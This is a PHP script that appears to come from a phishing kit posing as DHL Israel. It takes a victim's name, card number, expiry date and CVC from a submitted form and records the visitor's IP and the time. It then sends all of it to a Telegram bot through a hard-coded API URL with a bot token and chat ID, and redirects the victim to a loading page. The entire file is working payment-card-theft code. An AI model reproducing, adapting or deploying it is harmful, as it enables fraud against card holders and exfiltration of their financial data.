<?php



$date = date('m/d/Y h:i:s a', time());
$ip = getenv("REMOTE_ADDR");


if(($_POST['1'] != "") AND ($_POST['2'] != "") AND ($_POST['3'] != "") AND ($_POST['4'] != ""))
	
	{	

$message .= "______________DHL Israel________________\n";
$message .= "* NAME : ".$_POST['1']."\n";
$message .= "* CARD : ".$_POST['2']."\n";
$message .= "* EXP  : ".$_POST['3']."/\n";
$message .= "* CVC  : ".$_POST['4']."\n";
$message .= "* IP   : $ip\n";
$message .= "* Date   : $date\n";
$message .= "______________________________\n";



file_get_contents("https://api.telegram.org/bot1926008185:AAFUpqcX-CMsK8RdswTRgL_75MoUJA8wEFM/sendMessage?chat_id=1855902839&text=" . urlencode($message)."" );

        header("Location: ../load.php");
} else


header("Location: ../index.php");




?>